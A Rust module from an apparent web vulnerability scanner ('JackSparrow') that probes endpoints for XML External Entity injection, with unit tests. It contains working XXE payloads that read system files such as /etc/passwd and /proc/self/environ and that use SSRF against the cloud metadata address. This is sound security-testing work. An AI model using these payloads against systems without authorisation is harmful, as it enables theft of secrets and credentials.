#![allow(dead_code)]

use crate::core::scanners::{Scanner, ScannerType};
use crate::shared::config::JackSparrowConfig;
use crate::shared::context::ScanContext;
use crate::shared::error::JackSparrowError;
use crate::shared::types::{Confidence, Evidence, Finding, Severity, VulnerabilityType};
use async_trait::async_trait;
use reqwest::Client;

pub struct XxeScanner;

impl XxeScanner {
    pub fn new(_config: &JackSparrowConfig) -> Self {
        Self
    }

    fn build_client(&self, context: &ScanContext) -> Result<Client, JackSparrowError> {
        let mut builder = Client::builder()
            .timeout(std::time::Duration::from_secs(15))
            .danger_accept_invalid_certs(true);

        let mut headers = reqwest::header::HeaderMap::new();
        for (key, value) in &context.headers {
            if let (Ok(k), Ok(v)) = (
                reqwest::header::HeaderName::from_bytes(key.as_bytes()),
                reqwest::header::HeaderValue::from_str(value),
            ) {
                headers.insert(k, v);
            }
        }
        headers.insert(
            "User-Agent",
            reqwest::header::HeaderValue::from_static("JackSparrow/0.3.0"),
        );
        builder = builder.default_headers(headers);

        builder.build().map_err(|e| JackSparrowError::ToolExecutionFailed {
            tool: "xxe".to_string(),
            message: e.to_string(),
        })
    }

    /// XXE payloads targeting different file reads and SSRF
    fn xxe_payloads() -> Vec<(&'static str, &'static str, Severity)> {
        vec![
            // Linux file reads
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "Linux /etc/passwd", Severity::High),
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>", "Linux hostname", Severity::Medium),
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>", "Linux environment variables", Severity::Critical),
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>", "Linux kernel version", Severity::Medium),
            // Windows file reads
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "Windows win.ini", Severity::High),
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>", "Windows hosts file", Severity::High),
            // PHP filter (common in PHP apps)
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>", "PHP filter /etc/passwd", Severity::High),
            // SSRF via XXE
            ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "SSRF to AWS metadata", Severity::Critical),
            // Parameter entity (blind XXE)
            ("<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">%xxe;]>", "Blind XXE to metadata", Severity::Critical),
            // SVG XXE
            ("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><text>&#x25;&#x78;&#x65;&#x25;&#x20;&#x73;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x20;&#x65;&#x74;&#x63;/&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;</text></svg>", "SVG XXE", Severity::High),
        ]
    }

    /// Detect if target accepts XML content types
    async fn detect_xml_endpoints(
        &self,
        target: &str,
        client: &Client,
    ) -> Vec<String> {
        let mut xml_endpoints = Vec::new();

        // Common XML-accepting paths
        let paths = [
            "/", "/api", "/api/xml", "/xml", "/soap", "/ws", "/webhook",
            "/upload", "/import", "/feed", "/rss", "/sitemap.xml",
        ];

        for path in &paths {
            let url = format!("{}{}", target.trim_end_matches('/'), path);
            if let Ok(resp) = client
                .request(reqwest::Method::OPTIONS, &url)
                .send()
                .await
            {
                let content_type = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_string();
                let allow = resp
                    .headers()
                    .get("allow")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_string();

                if content_type.contains("xml") || allow.contains("POST") || path.contains("xml") || path.contains("soap") {
                    xml_endpoints.push(url);
                }
            }
        }

        // Always include the base target
        if xml_endpoints.is_empty() {
            xml_endpoints.push(target.to_string());
        }

        xml_endpoints
    }

    /// Test a single endpoint for XXE
    async fn test_endpoint_xxe(
        &self,
        endpoint: &str,
        client: &Client,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();
        let payloads = Self::xxe_payloads();

        for (payload, description, severity) in payloads {
            // Try Content-Type: application/xml
            let resp = client
                .post(endpoint)
                .header("Content-Type", "application/xml")
                .body(payload.to_string())
                .send()
                .await;

            if let Ok(response) = resp {
                let status = response.status();
                if status.is_success() || status.as_u16() == 500 {
                    if let Ok(body) = response.text().await {
                        // Check for XXE indicators in response
                        let indicators = [
                            "root:x:0:0",           // /etc/passwd
                            "[boot loader]",         // Windows win.ini
                            "DOCUMENT_ROOT",         // PHP environ
                            "AMI_ID",                // AWS metadata
                            "instance-id",           // AWS metadata
                            "hostname",              // /etc/hostname
                            "Linux version",         // /proc/version
                        ];

                        for indicator in &indicators {
                            if body.contains(indicator) {
                                let finding = Finding {
                                    id: uuid::Uuid::new_v4(),
                                    vulnerability_type: VulnerabilityType::Xxe,
                                    severity: severity.clone(),
                                    confidence: Confidence::Confirmed,
                                    title: format!("XXE vulnerability: {}", description),
                                    description: format!(
                                        "XML External Entity injection confirmed at {}. \
                                         Payload '{}' successfully read '{}'. \
                                         Response contained expected indicator '{}'.",
                                        endpoint, payload, description, indicator
                                    ),
                                    url: endpoint.to_string(),
                                    parameter: Some("XML body".to_string()),
                                    evidence: Evidence {
                                        request: Some(format!(
                                            "POST {} HTTP/1.1\r\nContent-Type: application/xml\r\n\r\n{}",
                                            endpoint, payload
                                        )),
                                        response: Some(body.chars().take(500).collect()),
                                        payload: Some(payload.to_string()),
                                        pattern: Some(indicator.to_string()),
                                        context: Some(description.to_string()),
                                    },
                                    remediation: "Disable XML external entity processing. \
                                        Use JSON instead of XML where possible. \
                                        Configure XML parsers to disallow DTDs and external entities. \
                                        Implement input validation and output encoding."
                                        .to_string(),
                                    references: vec![
                                        "https://cwe.mitre.org/data/definitions/611.html".to_string(),
                                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing".to_string(),
                                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html".to_string(),
                                    ],
                                    timestamp: chrono::Utc::now(),
                                    cvss_score: Some(8.5),
                                    cwe_id: Some("CWE-611".to_string()),
                                    tool_source: "xxe-scanner".to_string(),
                                };
                                findings.push(finding);
                                return findings; // One finding per endpoint is enough
                            }
                        }
                    }
                }
            }
        }

        findings
    }
}

#[async_trait]
impl Scanner for XxeScanner {
    fn scanner_type(&self) -> ScannerType {
        ScannerType::Xxe
    }

    async fn scan(
        &self,
        target: &str,
        _config: &JackSparrowConfig,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, JackSparrowError> {
        let client = self.build_client(context)?;

        // Detect XML endpoints
        let endpoints = self.detect_xml_endpoints(target, &client).await;

        let mut all_findings = Vec::new();

        // Test each endpoint (limit to 5 to avoid noise)
        for endpoint in endpoints.iter().take(5) {
            let findings = self.test_endpoint_xxe(endpoint, &client).await;
            all_findings.extend(findings);
        }

        Ok(all_findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_context() -> ScanContext {
        ScanContext {
            cookies: None,
            headers: Vec::new(),
            session: None,
        }
    }

    fn make_config() -> JackSparrowConfig {
        JackSparrowConfig::default()
    }

    #[test]
    fn scanner_type_is_xxe() {
        let scanner = XxeScanner::new(&make_config());
        assert_eq!(scanner.scanner_type(), ScannerType::Xxe);
    }

    #[test]
    fn xxe_payloads_contain_file_reads() {
        let payloads = XxeScanner::xxe_payloads();
        assert!(payloads.len() >= 8, "Should have at least 8 XXE payloads");
        // Check that we have Linux, Windows, and SSRF payloads
        let has_linux = payloads.iter().any(|(_, desc, _)| desc.contains("Linux") || desc.contains("/etc/"));
        let has_windows = payloads.iter().any(|(_, desc, _)| desc.contains("Windows"));
        let has_ssrf = payloads.iter().any(|(_, desc, _)| desc.contains("SSRF") || desc.contains("metadata"));
        assert!(has_linux, "Should have Linux file read payloads");
        assert!(has_windows, "Should have Windows file read payloads");
        assert!(has_ssrf, "Should have SSRF via XXE payloads");
    }

    #[test]
    fn build_client_works() {
        let scanner = XxeScanner::new(&make_config());
        let client = scanner.build_client(&make_context());
        assert!(client.is_ok());
    }

    #[tokio::test]
    async fn scan_handles_unreachable_target() {
        let scanner = XxeScanner::new(&make_config());
        let ctx = make_context();
        let config = make_config();
        // Use a port that doesn't exist on localhost for fast connection refused
        let result = scanner.scan("http://127.0.0.1:19999", &config, &ctx).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_endpoint_xxe_returns_empty_for_refused() {
        let scanner = XxeScanner::new(&make_config());
        let client = scanner.build_client(&make_context()).unwrap();
        let findings = scanner.test_endpoint_xxe("http://127.0.0.1:19999", &client).await;
        assert!(findings.is_empty());
    }
}
